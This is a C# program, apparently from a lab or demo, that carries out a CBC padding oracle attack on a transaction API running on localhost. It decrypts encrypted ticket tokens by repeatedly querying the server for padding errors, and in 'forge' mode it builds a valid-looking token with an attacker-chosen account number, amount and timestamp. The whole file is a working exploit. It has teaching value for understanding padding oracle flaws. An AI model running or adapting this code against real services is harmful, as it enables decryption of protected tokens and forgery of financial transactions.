using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace Attacker1
{
	class Program
	{
		static void Main( string[] args )
		{
			var blockSize = 16;
			var plainTextFrequencies = MakeGeneralFrequency();
			var randomTextFrequences = new string( plainTextFrequencies.Reverse().ToArray() );

			var mode = args[ 0 ];
			if ( mode == "forge" )
			{
				var forgeAccountNumber = args[ 1 ];
				var forgeTimeStamp = DateTime.UtcNow.AddMinutes( 120 ).ToString( "yyyy-MM-dd HH:mm:ss" );
				var forgeReasonCode = args[ 2 ];
				var forgeAmount = args[ 3 ];
				var millisecondsBetweenRequests = 0;
				if ( args.Length > 4 )
				{
					millisecondsBetweenRequests = Int32.Parse( args[ 4 ] );
				}

				var forgedTokenBytes = new List<byte>();

				var keyGen = new AesManaged();
				keyGen.GenerateKey();
				var randomBytes = keyGen.Key.Take( blockSize );

				var seedBlocks = new List<byte>( zeroIV );
				seedBlocks.AddRange( randomBytes );

				var desiredPlainText = forgeAccountNumber + "|" + forgeReasonCode + "|" + forgeAmount + "|" + forgeTimeStamp;

				//TODO: better handling for the case where the plaintext is an exact multiple of the block size
				if ( desiredPlainText.Length % blockSize == 0 )
				{
					desiredPlainText += " ";
				}
				Console.WriteLine( "Desired token:" );
				Console.WriteLine( desiredPlainText );
				Console.WriteLine( "Token length:" );
				Console.WriteLine( desiredPlainText.Length );
				Console.WriteLine( "Building ciphertext..." );

				var plainTextBlocks = new List<List<byte>>();
				while ( !String.IsNullOrEmpty( desiredPlainText ) )
				{
					var blockString = new string( desiredPlainText.Take( blockSize ).ToArray() );
					var blockBytes = new List<byte>( Encoding.ASCII.GetBytes( blockString ) );
					while ( blockBytes.Count < blockSize ) blockBytes.Add( (byte)( blockSize - blockString.Length ) );
					plainTextBlocks.Add( blockBytes );
					desiredPlainText = desiredPlainText.Remove( 0, blockString.Length );
				}

				// Special handling for last block
				var decryptedBlock = DecryptBlock( blockSize, seedBlocks.ToArray(), randomTextFrequences, millisecondsBetweenRequests );
				var prevCipherBlock = XorByteLists( decryptedBlock, plainTextBlocks[ plainTextBlocks.Count - 1 ] );

				forgedTokenBytes.InsertRange( 0, randomBytes );
				forgedTokenBytes.InsertRange( 0, prevCipherBlock );

				// remaining blocks
				for ( int i = plainTextBlocks.Count - 2; i >= 0; i-- )
				{
					seedBlocks.Clear();
					seedBlocks.AddRange( zeroIV );
					seedBlocks.AddRange( prevCipherBlock );
					decryptedBlock = DecryptBlock( blockSize, seedBlocks.ToArray(), plainTextFrequencies, millisecondsBetweenRequests );
					prevCipherBlock = XorByteLists( decryptedBlock, plainTextBlocks[ i ] );

					forgedTokenBytes.InsertRange( 0, prevCipherBlock );
				}

				var forgedTokenString = ByteArrayToString( forgedTokenBytes.ToArray() );

				Console.WriteLine( "---------------------------------------------------------------" );
				Console.WriteLine( forgedTokenString );
				Console.WriteLine( "---------------------------------------------------------------" );
				//Console.ReadLine();
			}
			else
			{
				var ctext = args[ 1 ];
				var millisecondsBetweenRequests = 0;
				if ( args.Length > 2 )
				{
					millisecondsBetweenRequests = Int32.Parse( args[ 2 ] );
				}
				byte[] origBytes = StringToByteArray( ctext );

				var plainText = new List<byte>();
				var totalBlocks = origBytes.Length / blockSize;

				for ( var blockIndex = 0; blockIndex < totalBlocks - 1; blockIndex++ )
				{
					var blockBytes = origBytes.Skip( blockSize * blockIndex ).Take( blockSize * 2 ).ToArray();
					plainText.AddRange( DecryptBlock( blockSize, blockBytes.ToArray(), plainTextFrequencies, millisecondsBetweenRequests ) );
				}

				Console.WriteLine( "---------------------------------------------------------------" );
				Console.WriteLine( Encoding.ASCII.GetString( plainText.ToArray() ) );
				Console.WriteLine( "---------------------------------------------------------------" );
			}
			Console.WriteLine( "Requests: " + RequestCounter );
		}

		private static byte[] XorByteLists( List<byte> block1, List<byte> block2 )
		{
			if ( block1.Count != block2.Count ) throw new ArgumentException( "block lengths are different" );

			var returnBytes = new byte[ block2.Count ];
			for ( var i = 0; i < block2.Count; i++ )
			{
				returnBytes[ i ] = (byte)( block1[ i ] ^ block2[ i ] );
			}
			return returnBytes;
		}

		public static byte[] StringToByteArray( String hex )
		{
			int NumberChars = hex.Length;
			byte[] bytes = new byte[ NumberChars / 2 ];
			for ( int i = 0; i < NumberChars; i += 2 )
			{
				bytes[ i / 2 ] = Convert.ToByte( hex.Substring( i, 2 ), 16 );
			}
			return bytes;
		}

		public static string ByteArrayToString( byte[] ba )
		{
			StringBuilder hex = new StringBuilder( ba.Length * 2 );
			foreach ( byte b in ba )
			{
				hex.AppendFormat( "{0:x2}", b );
			}
			return hex.ToString();
		}

		static string MakeGeneralFrequency()
		{
			string freq = "|0123456789etaionsrlhdcumpfgybwETAIONS";
			AddASCIIRange( ref freq, 97, 122 );
			AddASCIIRange( ref freq, 65, 90 );
			AddASCIIRange( ref freq, 0, 255 );
			return freq;
		}

		static void AddASCIIRange( ref string freq, int start, int end )
		{
			for ( var i = start; i <= end; i++ )
			{
				var c = (char)i;
				if ( !freq.Contains( c ) )
				{
					freq += c;
				}
			}
		}

		static List<byte> DecryptBlock( int blockSize, byte[] cipherBytes, string freq, int millisecondsBetweenRequests = 0 )
		{
			var returnBytes = new List<byte>();
			List<byte> byteListModified = new List<byte>( cipherBytes );

			string plainText = "";
			var iPrime = new List<byte>();
			for ( var fiddlePos = blockSize - 1; fiddlePos >= 0; fiddlePos-- )
			{
				for ( var attempt = 0; attempt < 256; attempt++ )
				{
					var fiddleByte = ( blockSize - fiddlePos ) ^ cipherBytes[ fiddlePos ] ^ freq[ attempt ];
					byteListModified[ fiddlePos ] = (byte)fiddleByte;
					var newToken = ByteArrayToString( byteListModified.ToArray() );
					var isValid = isValidPadding( newToken );
					if ( millisecondsBetweenRequests != 0 )
					{
						System.Threading.Thread.Sleep( millisecondsBetweenRequests );
					}

					// prevent false positive on last byte of a padded block
					if ( isValid && fiddlePos == blockSize - 1 )
					{
						byteListModified[ fiddlePos - 1 ] = (byte)( byteListModified[ fiddlePos - 1 ] ^ 1 );
						newToken = ByteArrayToString( byteListModified.ToArray() );
						isValid = isValidPadding( newToken );
					}

					if ( isValid )
					{
						var paddingValue = (byte)( blockSize - fiddlePos );
						var i2 = (byte)fiddleByte ^ paddingValue;
						iPrime.Add( (byte)i2 );
						var c2 = i2 ^ cipherBytes[ fiddlePos ];
						plainText = (char)c2 + plainText;
						returnBytes.Insert( 0, (byte)c2 );
						Console.WriteLine( plainText );

						var primeCounter = 0;
						for ( var tail = blockSize - 1; tail >= fiddlePos; tail-- )
						{
							var vvv = iPrime[ primeCounter++ ];
							var nextPadding = paddingValue + 1;
							byteListModified[ tail ] = (byte)( vvv ^ nextPadding );
						}
						break;
					}
				}
			}
			return returnBytes;
		}

		static bool isValidPadding( string token )
		{
			var UrlPrefix = "http://localhost:55165/api/transaction?ticket=";

			var requestUrl = UrlPrefix + token;
			var request = WebRequest.Create( requestUrl );

			var isValidPadding = false;
			var response = request.GetResponse();
			using ( Stream dataStream = response.GetResponseStream() )
			{
				using ( StreamReader reader = new StreamReader( dataStream ) )
				{
					var responseFromServer = reader.ReadToEnd();
					isValidPadding = !responseFromServer.Contains( "Bad Token" );
				}
			}
			RequestCounter++;
			return isValidPadding;
		}
		static long RequestCounter = 0;

		static byte[] zeroIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	}
}